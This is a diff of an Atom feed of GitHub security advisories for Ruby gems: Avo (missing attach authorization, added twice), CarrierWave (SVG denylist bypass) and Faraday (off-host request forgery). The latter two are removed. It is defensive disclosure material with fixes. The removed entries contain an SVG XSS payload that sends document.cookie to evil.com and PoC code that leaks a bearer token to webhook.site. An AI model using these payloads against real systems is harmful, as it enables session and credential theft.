@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-06-17T17:57:19.695Z</updated>
+    <updated>2026-06-17T18:53:26.572Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,322 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[avo] Avo: Missing Authorization in Avo Association Attach Endpoint Allows Unauthorized Relationship Manipulation and Privilege Escalation]]></title>
+        <id>https://github.com/advisories/GHSA-8fq9-273g-6mrg</id>
+        <link href="https://github.com/advisories/GHSA-8fq9-273g-6mrg"/>
+        <updated>2026-06-17T18:49:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A critical missing authorization flaw exists in Avo's association attach workflow. The UI and <code>GET /resources/:resource/:id/:related/new</code> path can check <code>attach_&lt;association&gt;?</code>, but the actual write endpoint, <code>POST /resources/:resource/:id/:related</code>, does not run the same authorization check before mutating the association.</p>
+<p>As a result, an authenticated low-privileged Avo user can bypass hidden/disabled attach controls and directly attach related records to a parent record by sending a crafted POST request. In applications where associations represent teams, tenants, roles, projects, users, memberships, ownership, or other authorization-bearing relationships, this can lead to privilege escalation and cross-tenant data exposure.</p>
+<h2 id="details">Details</h2>
+<p>The association attach route writes relationships through <code>Avo::AssociationsController#create</code>:</p>
+<pre><code class="language-ruby"># config/routes.rb
+post "/:resource_name/:id/:related_name", to: "associations#create", as: "associations_create"
+</code></pre>
+<p>The controller registers an attach authorization callback only for <code>new</code>, not for <code>create</code>:</p>
+<pre><code class="language-ruby"># app/controllers/avo/associations_controller.rb
+before_action :set_attachment_record, only: [:create, :destroy]
+before_action :authorize_index_action, only: :index
+before_action :authorize_attach_action, only: :new
+before_action :authorize_detach_action, only: :destroy
+</code></pre>
+<p>The <code>new</code> action is only the form-rendering step. The actual mutation happens in <code>create</code>:</p>
+<pre><code class="language-ruby">def create
+  if create_association
+    create_success_action
+  else
+    create_fail_action
+  end
+end
+</code></pre>
+<p><code>create_association</code> then attaches the attacker-supplied related record to the parent:</p>
+<pre><code class="language-ruby">def create_association
+  association_name = BaseResource.valid_association_name(@record, association_from_params)
+
+  perform_action_and_record_errors do
+    if through_reflection? &amp;&amp; additional_params.present?
+      new_join_record.save
+    elsif has_many_reflection? || through_reflection?
+      @record.send(association_name) &lt;&lt; @attachment_record
+    else
+      @record.send(:"#{association_name}=", @attachment_record)
+      @record.save!
+    end
+  end
+end
+</code></pre>
+<p>The only attach-specific authorization helper is:</p>
+<pre><code class="language-ruby">def authorize_attach_action
+  authorize_if_defined "attach_#{@field.id}?"
+end
+</code></pre>
+<p>Because this helper is bound only to <code>new</code>, a policy that denies <code>attach_users?</code>, <code>attach_teams?</code>, <code>attach_roles?</code>, or similar methods blocks the UI/form path but does not protect the write path.</p>
+<p>This is inconsistent with the detach path, which does authorize the mutating <code>destroy</code> action:</p>
+<pre><code class="language-ruby">before_action :authorize_detach_action, only: :destroy
+</code></pre>
+<p>The bug is especially dangerous because Avo already treats association authorization as an access-control boundary in UI components:</p>
+<pre><code class="language-ruby"># lib/avo/concerns/checks_assoc_authorization.rb
+method_name = :"#{policy_method}_#{association_name}?".to_sym
+
+if service.has_method?(method_name, raise_exception: false)
+  service.authorize_action(method_name, record:, raise_exception: false)
+else
+  !Avo.configuration.explicit_authorization
+end
+</code></pre>
+<p>However, server-side enforcement is missing on the actual attach POST endpoint.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Prerequisites:</p>
+<ol>
+<li>A Rails application mounts Avo, for example at <code>/admin</code>.</li>
+<li>Avo authorization is enabled.</li>
+<li>A low-privileged user can authenticate to Avo.</li>
+<li>A parent record and a related record are both reachable by ID.</li>
+<li>The relevant policy denies attaching the relationship, for example:</li>
+</ol>
+<pre><code class="language-ruby">def attach_users?
+  false
+end
+</code></pre>
+<p>Example target scenario:</p>
+<ul>
+<li>Parent resource: <code>projects</code></li>
+<li>Parent ID: <code>1</code></li>
+<li>Related association: <code>users</code></li>
+<li>Related user ID to attach: <code>42</code></li>
+<li>Expected policy: low-privileged users must not be able to attach users to projects.</li>
+</ul>
+<p>The UI/form request may be blocked:</p>
+<pre><code class="language-http">GET /admin/resources/projects/1/users/new
+</code></pre>
+<p>But the direct write endpoint can still be invoked:</p>
+<pre><code class="language-http">POST /admin/resources/projects/1/users
+Content-Type: application/x-www-form-urlencoded
+
+authenticity_token=&lt;CSRF&gt;&amp;fields[related_id]=42
+</code></pre>
+<p>Run the attached PoC:</p>
+<pre><code class="language-bash">python poc_avo_association_attach_bypass.py \
+  --base-url http://localhost:3000 \
+  --avo-root /admin \
+  --cookie "_app_session=&lt;LOW_PRIVILEGED_SESSION_COOKIE&gt;" \
+  --parent-resource projects \
+  --parent-id 1 \
+  --related-name users \
+  --related-id 42 \
+  --check-new
+</code></pre>
+<p>If <code>GET /new</code> is forbidden or redirected but the direct POST succeeds, the authorization bypass is confirmed.</p>
+<p>To perform the actual attach:</p>
+<pre><code class="language-bash">python poc_avo_association_attach_bypass.py \
+  --base-url http://localhost:3000 \
+  --avo-root /admin \
+  --cookie "_app_session=&lt;LOW_PRIVILEGED_SESSION_COOKIE&gt;" \
+  --parent-resource projects \
+  --parent-id 1 \
+  --related-name users \
+  --related-id 42 \
+  --confirm-attach
+</code></pre>
+<p>Expected vulnerable result:</p>
+<ul>
+<li>The low-privileged user can attach the related record despite <code>attach_&lt;association&gt;?</code> being denied.</li>
+<li>The parent record now includes the related record.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability allows unauthorized relationship manipulation through Avo.</p>
+<p>Depending on the affected association, the impact can include:</p>
+<ul>
+<li>Privilege escalation by attaching a user to an admin group, privileged project, tenant, organization, role, or membership record.</li>
+<li>Cross-tenant data exposure when tenant/user/project membership determines record visibility.</li>
+<li>Integrity loss by changing ownership, assignment, access-control relationships, or business workflow state.</li>
+<li>Policy bypass even when Avo UI controls correctly hide the attach button or deny the attach form.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Enforce attach authorization on the mutating endpoint.</p>
+<p>At minimum:</p>
+<pre><code class="language-ruby">before_action :authorize_attach_action, only: [:new, :create]
+</code></pre>
+<p>Additionally:</p>
+<ol>
+<li>Authorize against the parent record and the selected related record before writing the relationship.</li>
+<li>Ensure <code>create</code> fails closed when <code>attach_&lt;association&gt;?</code> is missing and <code>explicit_authorization</code> is enabled.</li>
+<li>Add regression tests that directly POST to <code>/resources/:resource_name/:id/:related_name</code> while <code>attach_&lt;association&gt;?</code> returns <code>false</code>.</li>
+<li>Verify <code>has_many</code>, <code>has_one</code>, <code>has_many :through</code>, and <code>has_and_belongs_to_many</code> association paths all enforce the same server-side authorization.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/avo-hq/avo/security/advisories/GHSA-8fq9-273g-6mrg">https://github.com/avo-hq/avo/security/advisories/GHSA-8fq9-273g-6mrg</a></li>
+<li><a href="https://github.com/advisories/GHSA-8fq9-273g-6mrg">https://github.com/advisories/GHSA-8fq9-273g-6mrg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8fq9-273g-6mrg</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-17T18:49:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[avo] Avo: Missing Authorization in Avo Association Attach Endpoint Allows Unauthorized Relationship Manipulation and Privilege Escalation]]></title>
+        <id>https://github.com/advisories/GHSA-8fq9-273g-6mrg</id>
+        <link href="https://github.com/advisories/GHSA-8fq9-273g-6mrg"/>
+        <updated>2026-06-17T18:49:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A critical missing authorization flaw exists in Avo's association attach workflow. The UI and <code>GET /resources/:resource/:id/:related/new</code> path can check <code>attach_&lt;association&gt;?</code>, but the actual write endpoint, <code>POST /resources/:resource/:id/:related</code>, does not run the same authorization check before mutating the association.</p>
+<p>As a result, an authenticated low-privileged Avo user can bypass hidden/disabled attach controls and directly attach related records to a parent record by sending a crafted POST request. In applications where associations represent teams, tenants, roles, projects, users, memberships, ownership, or other authorization-bearing relationships, this can lead to privilege escalation and cross-tenant data exposure.</p>
+<h2 id="details">Details</h2>
+<p>The association attach route writes relationships through <code>Avo::AssociationsController#create</code>:</p>
+<pre><code class="language-ruby"># config/routes.rb
+post "/:resource_name/:id/:related_name", to: "associations#create", as: "associations_create"
+</code></pre>
+<p>The controller registers an attach authorization callback only for <code>new</code>, not for <code>create</code>:</p>
+<pre><code class="language-ruby"># app/controllers/avo/associations_controller.rb
+before_action :set_attachment_record, only: [:create, :destroy]
+before_action :authorize_index_action, only: :index
+before_action :authorize_attach_action, only: :new
+before_action :authorize_detach_action, only: :destroy
+</code></pre>
+<p>The <code>new</code> action is only the form-rendering step. The actual mutation happens in <code>create</code>:</p>
+<pre><code class="language-ruby">def create
+  if create_association
+    create_success_action
+  else
+    create_fail_action
+  end
+end
+</code></pre>
+<p><code>create_association</code> then attaches the attacker-supplied related record to the parent:</p>
+<pre><code class="language-ruby">def create_association
+  association_name = BaseResource.valid_association_name(@record, association_from_params)
+
+  perform_action_and_record_errors do
+    if through_reflection? &amp;&amp; additional_params.present?
+      new_join_record.save
+    elsif has_many_reflection? || through_reflection?
+      @record.send(association_name) &lt;&lt; @attachment_record
+    else
+      @record.send(:"#{association_name}=", @attachment_record)
+      @record.save!
+    end
+  end
+end
+</code></pre>
+<p>The only attach-specific authorization helper is:</p>
+<pre><code class="language-ruby">def authorize_attach_action
+  authorize_if_defined "attach_#{@field.id}?"
+end
+</code></pre>
+<p>Because this helper is bound only to <code>new</code>, a policy that denies <code>attach_users?</code>, <code>attach_teams?</code>, <code>attach_roles?</code>, or similar methods blocks the UI/form path but does not protect the write path.</p>
+<p>This is inconsistent with the detach path, which does authorize the mutating <code>destroy</code> action:</p>
+<pre><code class="language-ruby">before_action :authorize_detach_action, only: :destroy
+</code></pre>
+<p>The bug is especially dangerous because Avo already treats association authorization as an access-control boundary in UI components:</p>
+<pre><code class="language-ruby"># lib/avo/concerns/checks_assoc_authorization.rb
+method_name = :"#{policy_method}_#{association_name}?".to_sym
+
+if service.has_method?(method_name, raise_exception: false)
+  service.authorize_action(method_name, record:, raise_exception: false)
+else
+  !Avo.configuration.explicit_authorization
+end
+</code></pre>
+<p>However, server-side enforcement is missing on the actual attach POST endpoint.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Prerequisites:</p>
+<ol>
+<li>A Rails application mounts Avo, for example at <code>/admin</code>.</li>
+<li>Avo authorization is enabled.</li>
+<li>A low-privileged user can authenticate to Avo.</li>
+<li>A parent record and a related record are both reachable by ID.</li>
+<li>The relevant policy denies attaching the relationship, for example:</li>
+</ol>
+<pre><code class="language-ruby">def attach_users?
+  false
+end
+</code></pre>
+<p>Example target scenario:</p>
+<ul>
+<li>Parent resource: <code>projects</code></li>
+<li>Parent ID: <code>1</code></li>
+<li>Related association: <code>users</code></li>
+<li>Related user ID to attach: <code>42</code></li>
+<li>Expected policy: low-privileged users must not be able to attach users to projects.</li>
+</ul>
+<p>The UI/form request may be blocked:</p>
+<pre><code class="language-http">GET /admin/resources/projects/1/users/new
+</code></pre>
+<p>But the direct write endpoint can still be invoked:</p>
+<pre><code class="language-http">POST /admin/resources/projects/1/users
+Content-Type: application/x-www-form-urlencoded
+
+authenticity_token=&lt;CSRF&gt;&amp;fields[related_id]=42
+</code></pre>
+<p>Run the attached PoC:</p>
+<pre><code class="language-bash">python poc_avo_association_attach_bypass.py \
+  --base-url http://localhost:3000 \
+  --avo-root /admin \
+  --cookie "_app_session=&lt;LOW_PRIVILEGED_SESSION_COOKIE&gt;" \
+  --parent-resource projects \
+  --parent-id 1 \
+  --related-name users \
+  --related-id 42 \
+  --check-new
+</code></pre>
+<p>If <code>GET /new</code> is forbidden or redirected but the direct POST succeeds, the authorization bypass is confirmed.</p>
+<p>To perform the actual attach:</p>
+<pre><code class="language-bash">python poc_avo_association_attach_bypass.py \
+  --base-url http://localhost:3000 \
+  --avo-root /admin \
+  --cookie "_app_session=&lt;LOW_PRIVILEGED_SESSION_COOKIE&gt;" \
+  --parent-resource projects \
+  --parent-id 1 \
+  --related-name users \
+  --related-id 42 \
+  --confirm-attach
+</code></pre>
+<p>Expected vulnerable result:</p>
+<ul>
+<li>The low-privileged user can attach the related record despite <code>attach_&lt;association&gt;?</code> being denied.</li>
+<li>The parent record now includes the related record.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability allows unauthorized relationship manipulation through Avo.</p>
+<p>Depending on the affected association, the impact can include:</p>
+<ul>
+<li>Privilege escalation by attaching a user to an admin group, privileged project, tenant, organization, role, or membership record.</li>
+<li>Cross-tenant data exposure when tenant/user/project membership determines record visibility.</li>
+<li>Integrity loss by changing ownership, assignment, access-control relationships, or business workflow state.</li>
+<li>Policy bypass even when Avo UI controls correctly hide the attach button or deny the attach form.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Enforce attach authorization on the mutating endpoint.</p>
+<p>At minimum:</p>
+<pre><code class="language-ruby">before_action :authorize_attach_action, only: [:new, :create]
+</code></pre>
+<p>Additionally:</p>
+<ol>
+<li>Authorize against the parent record and the selected related record before writing the relationship.</li>
+<li>Ensure <code>create</code> fails closed when <code>attach_&lt;association&gt;?</code> is missing and <code>explicit_authorization</code> is enabled.</li>
+<li>Add regression tests that directly POST to <code>/resources/:resource_name/:id/:related_name</code> while <code>attach_&lt;association&gt;?</code> returns <code>false</code>.</li>
+<li>Verify <code>has_many</code>, <code>has_one</code>, <code>has_many :through</code>, and <code>has_and_belongs_to_many</code> association paths all enforce the same server-side authorization.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/avo-hq/avo/security/advisories/GHSA-8fq9-273g-6mrg">https://github.com/avo-hq/avo/security/advisories/GHSA-8fq9-273g-6mrg</a></li>
+<li><a href="https://github.com/advisories/GHSA-8fq9-273g-6mrg">https://github.com/advisories/GHSA-8fq9-273g-6mrg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8fq9-273g-6mrg</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-17T18:49:11.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[net-imap] Net::IMAP: Command Injection via ID command argument]]></title>
         <id>https://github.com/advisories/GHSA-46q3-7gv7-qmgg</id>
@@ -1270,236 +1586,5 @@ curl -X POST http://localhost:4567/upload \
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-27T00:03:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[carrierwave] CarrierWave has a denylisted_content_type bypass via Unescaped Regex Metacharacters]]></title>
-        <id>https://github.com/advisories/GHSA-7g26-2qgj-chfg</id>
-        <link href="https://github.com/advisories/GHSA-7g26-2qgj-chfg"/>
-        <updated>2026-06-09T10:35:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>CarrierWave's content_type_denylist check fails to escape regex metacharacters in string entries, causing the denylist to silently not match the content types it is intended to block.</p>
-<p><strong>Note</strong>: CarrierWave is aware <code>#content_type_denylist is deprecated for the security reason</code>, but it still used by developers, and the problem here isn't denylist allows any filetype, and thats not a  vulnerability in carrierwave, its an implementation problem in developers using CarrierWave, the problem is its denylist entries are interpolated directly into a regex without <code>Regexp.quote</code> or anchoring. The denylist is still useful when developers want to ban specific content types but allow everything else.</p>
-<h3 id="details">Details</h3>
-<p>In <code>lib/carrierwave/uploader/content_type_denylist.rb:57</code>, string denylist entries are interpolated directly into a regex without <code>Regexp.quote</code> or anchoring:</p>
-<pre><code class="language-ruby">def denylisted_content_type?(denylist, content_type)
-  Array(denylist).any? { |item| content_type =~ /#{item}/ }
-end
-The entry "image/svg+xml" becomes the regex /image\/svg+xml/ where + is a quantifier meaning "one or more g", not a literal +. This regex never matches the real MIME type "image/svg+xml" which contains a literal +.
-This is inconsistent with the allowlist implementation at lib/carrierwave/uploader/content_type_allowlist.rb:53-57, which correctly applies both Regexp.quote and a \A anchor:
-rubydef allowlisted_content_type?(allowlist, content_type)
-  Array(allowlist).any? do |item|
-    item = Regexp.quote(item) if item.class != Regexp
-    content_type =~ /\A#{item}/
-  end
-end
-</code></pre>
-<p>Other affected MIME types include <code>application/xhtml+xml</code> and any type containing regex metacharacters.</p>
-<p>Fix: Apply Regexp.quote for string entries and anchor with \A, matching the existing allowlist implementation:</p>
-<pre><code>rubydef denylisted_content_type?(denylist, content_type)
-  Array(denylist).any? do |item|
-    item = Regexp.quote(item) if item.class != Regexp
-    content_type =~ /\A#{item}/
-  end
-end
-</code></pre>
-<h3 id="poc">PoC</h3>
-<pre><code> app.rb
-require "sinatra"
-require "carrierwave"
-require "fileutils"
-
-FileUtils.mkdir_p("uploads/files")
-
-CarrierWave.configure do |config|
-  config.root      = File.expand_path("uploads")
-  config.store_dir = "files"
-end
-
-class VaultUploader &lt; CarrierWave::Uploader::Base
-  storage :file
-  def store_dir = "files"
-  def content_type_denylist = %w[image/svg+xml]
-end
-
-post "/upload" do
-  content_type :json
-  san = CarrierWave::SanitizedFile.new(
-    tempfile:     params[:file][:tempfile],
-    filename:     params[:file][:filename],
-    content_type: params[:file][:type]
-  )
-  uploader = VaultUploader.new
-  begin
-    uploader.store!(san)
-    { result: "VULNERABLE", message: "SVG bypassed denylist", path: uploader.path }.to_json
-  rescue CarrierWave::IntegrityError =&gt; e
-    { result: "blocked", message: e.message }.to_json
-  end
-end
-</code></pre>
-<pre><code>bundle exec ruby app.rb &amp;
-
-echo '&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;document.location="https://evil.com/?c="+document.cookie&lt;/script&gt;&lt;/svg&gt;' &gt; xss.svg
-
-curl -X POST http://localhost:4567/upload \
-  -F "file=@xss.svg;type=image/svg+xml"
-</code></pre>
-<p>Expected response (denylist working):</p>
-<pre><code>json{ "result": "blocked", "message": "..." }
-</code></pre>
-<p>Actual response:</p>
-<pre><code>json{ "result": "VULNERABLE", "message": "SVG bypassed denylist", "path": "..." }
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Any application that uses content_type_denylist to block image/svg+xml — the most common use case, specifically to prevent stored XSS — is silently unprotected. An attacker can upload an SVG file containing arbitrary</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-7g26-2qgj-chfg">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-7g26-2qgj-chfg</a></li>
-<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2026-44587.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2026-44587.yml</a></li>
-<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-44587">https://www.cve.org/CVERecord?id=CVE-2026-44587</a></li>
-<li><a href="https://github.com/advisories/GHSA-7g26-2qgj-chfg">https://github.com/advisories/GHSA-7g26-2qgj-chfg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7g26-2qgj-chfg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-27T00:03:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[faraday] Faraday has a possible incomplete fix for GHSA-33mh-2634-fwr2: protocol-relative URI objects still bypass host scoping]]></title>
-        <id>https://github.com/advisories/GHSA-5rv5-xj5j-3484</id>
-        <link href="https://github.com/advisories/GHSA-5rv5-xj5j-3484"/>
-        <updated>2026-06-05T14:12:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Faraday::Connection#build_exclusive_url</code> still allows protocol-relative host override when the request target is provided as a <code>URI</code> object instead of a <code>String</code>. This bypasses the February 2026 fix for <code>GHSA-33mh-2634-fwr2</code> and can redirect a request built from a fixed-base <code>Faraday::Connection</code> to an attacker-controlled host while preserving connection-scoped headers such as <code>Authorization</code>.</p>
-<h2 id="affected-component">Affected Component</h2>
-<ul>
-<li><strong>Repository File(s)/Endpoint(s)</strong>:<ul>
-<li><code>lib/faraday/connection.rb</code></li>
-<li><code>lib/faraday/request.rb</code></li>
-<li><code>spec/faraday/connection_spec.rb</code></li>
-<li><code>spec/faraday/request_spec.rb</code></li>
-</ul>
-</li>
-<li><strong>Function(s)</strong>:<ul>
-<li><code>Faraday::Connection#build_exclusive_url</code></li>
-<li><code>Faraday::Connection#run_request</code></li>
-<li><code>Faraday::Request#url</code></li>
-<li><code>Faraday::Request#to_env</code></li>
-</ul>
-</li>
-<li><strong>Version(s) Tested</strong>:<ul>
-<li><code>Faraday 2.14.1</code></li>
-<li>repository HEAD <code>a01039c948d3e9e41e03d152aed7244f0fb4d5ca</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="attacker-profile">Attacker Profile</h2>
-<ul>
-<li><strong>Who</strong>: A remote user who can influence a per-request target/path in an application that uses a fixed-base Faraday connection</li>
-<li><strong>Access Required</strong>: Ability to supply data that the application converts to <code>URI.parse(...)</code> and passes to <code>conn.get(...)</code>, <code>[conn.post](http://conn.post/)(...)</code>, or <code>req.url(...)</code></li>
-<li><strong>Capability</strong>: Control over a protocol-relative URI such as <code>URI("//evil.example/pwn")</code></li>
-</ul>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<ol>
-<li>Use the current repository checkout and load Faraday from <code>lib/</code>.</li>
-<li>Build a fixed-base connection and provide a protocol-relative <code>URI</code> object to <code>req.url</code>.</li>
-<li>Observe that the request is actually sent to the attacker-controlled host instead of the configured base host.</li>
-<li>Observe that the connection-scoped <code>Authorization</code> header remains attached to the off-host request.</li>
-</ol>
-<h3 id="verification-evidence">Verification Evidence</h3>
-<ul>
-<li><strong>Environment</strong>: macOS, Ruby from local environment, Faraday <code>2.14.1</code>, <code>faraday-net_http</code>, local WEBrick listener on <code>127.0.0.1:4567</code>, HEAD <code>a01039c948d3e9e41e03d152aed7244f0fb4d5ca</code></li>
-<li><strong>Commands executed</strong>:</li>
-</ul>
-<pre><code class="language-bash">$ ruby -e 'require "webrick"; server = WEBrick::HTTPServer.new(Port: 4567, BindAddress: "127.0.0.1", AccessLog: [], Logger: WEBrick::Log.new($stderr, WEBrick::Log::WARN)); server.mount_proc("/") { |req, res| res.status = 200; res.body = "host=#{req.host}\nauth=#{req["Authorization"]}\npath=#{req.path}\n" }; trap("INT") { server.shutdown }; server.start'
-$ ruby -Ilib -e 'require "faraday"; require "faraday/net_http"; conn = Faraday.new(url: "http://trusted.example/base", headers: {"Authorization" =&gt; "Bearer secret-token"}) { |f| f.adapter :net_http }; target = ["//127.0.0.1:4567", "/pwn"].join; resp = conn.get(URI(target)); puts resp.status; puts resp.body'
-</code></pre>
-<ul>
-<li><strong>PoC code</strong> (inline):</li>
-</ul>
-<pre><code class="language-ruby">require "faraday"
-require "faraday/net_http"
-
-conn = Faraday.new(url: "http://trusted.example/base", headers: {
-  "Authorization" =&gt; "Bearer secret-token"
-}) { |f| f.adapter :net_http }
-
-target = ["//127.0.0.1:4567", "/pwn"].join
-resp = conn.get(URI(target))
-
-puts resp.status
-puts resp.body
-</code></pre>
-<ul>
-<li><strong>Exit code</strong>: <code>0</code></li>
-<li><strong>stdout</strong> (relevant excerpt):</li>
-</ul>
-<pre><code class="language-text">200
-host=127.0.0.1
-auth=Bearer secret-token
-path=/pwn
-</code></pre>
-<ul>
-<li><strong>stderr</strong> (relevant excerpt):</li>
-</ul>
-<pre><code class="language-text">N/A
-</code></pre>
-<ul>
-<li><strong>Artifacts</strong>: none</li>
-</ul>
-<h3 id="additional-external-confirmation">Additional External Confirmation</h3>
-<p>The issue was also independently reproduced against a public HTTP collector on Faraday <code>2.14.1</code> using the default <code>net_http</code> adapter:</p>
-<pre><code class="language-ruby">require "faraday"
-require "faraday/net_http"
-
-conn = Faraday.new(
-  url: "http://trusted.example/base",
-  headers: { "Authorization" =&gt; "Bearer secret-token" }
-) { |f| f.adapter :net_http }
-
-target = ["//webhook.site", "/&lt;collector-id&gt;"].join
-resp = conn.get(URI(target))
-resp.status
-# =&gt; 200
-resp.url.host
-# =&gt; "webhook.site"
-</code></pre>
-<p>This external confirmation shows the request is not only misbuilt in memory, but is actually dispatched off-host by a real adapter under normal usage.</p>
-<h2 id="supporting-materials">Supporting Materials</h2>
-<ul>
-<li>Existing advisory for the original string-based issue: <code>GHSA-33mh-2634-fwr2</code></li>
-<li>Existing CVE for the original string-based issue: <code>CVE-2026-25765</code></li>
-<li>Existing regression tests for the string-only fix:<ul>
-<li><code>spec/faraday/connection_spec.rb:314-345</code></li>
-</ul>
-</li>
-<li>Existing test proving supported <code>URI</code> request input:<ul>
-<li><code>spec/faraday/request_spec.rb:26-31</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>The direct consequence is off-host request forgery from code paths that believe they are constrained to a fixed base URL. If the
-connection carries default headers or query parameters, those values are forwarded to the attacker-selected host.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lostisland/faraday/security/advisories/GHSA-5rv5-xj5j-3484">https://github.com/lostisland/faraday/security/advisories/GHSA-5rv5-xj5j-3484</a></li>
-<li><a href="https://github.com/advisories/GHSA-33mh-2634-fwr2">https://github.com/advisories/GHSA-33mh-2634-fwr2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33637">https://nvd.nist.gov/vuln/detail/CVE-2026-33637</a></li>
-<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/faraday/CVE-2026-33637.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/faraday/CVE-2026-33637.yml</a></li>
-<li><a href="https://github.com/advisories/GHSA-5rv5-xj5j-3484">https://github.com/advisories/GHSA-5rv5-xj5j-3484</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5rv5-xj5j-3484</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-18T14:51:51.000Z</published>
     </entry>
 </feed>
